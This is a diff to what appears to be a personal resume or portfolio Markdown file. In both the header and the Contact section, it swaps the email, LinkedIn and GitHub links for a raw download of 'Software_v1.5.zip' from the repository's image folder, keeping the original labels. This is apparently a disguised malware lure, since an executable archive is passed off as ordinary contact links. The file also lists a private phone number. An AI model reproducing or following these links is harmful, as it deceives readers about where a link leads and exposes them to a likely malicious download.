@@ -2,9 +2,9 @@
 
 Sampaloc, Manila 
 
-Email: deleonangelojervil@gmail.com | Phone: 0962-586-5208  
-LinkedIn: [linkedin.com/in/jervilangelo](https://linkedin.com/in/jervilangelo)  
-GitHub: [jervilangel0.github.io/portfolio/](https://jervilangel0.github.io/portfolio/)  
+Email: https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip | Phone: 0962-586-5208  
+LinkedIn: [https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip](https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip)  
+GitHub: [https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip](https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip)  
 
 ---
 
@@ -62,6 +62,6 @@ Bachelor of Science in Information Technology – Specialization in Animation an
 ---
 
 ## Contact  
-Email: deleonangelojervil@gmail.com | Phone: 0962-586-5208  
-LinkedIn: [linkedin.com/in/jervilangelo](https://linkedin.com/in/jervilangelo)  
-GitHub: [jervilangel0.github.io/portfolio/](https://jervilangel0.github.io/portfolio/)  
+Email: https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip | Phone: 0962-586-5208  
+LinkedIn: [https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip](https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip)  
+GitHub: [https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip](https://github.com/jervilangel0/portfolio/raw/refs/heads/main/assets/img/Software_v1.5.zip)  
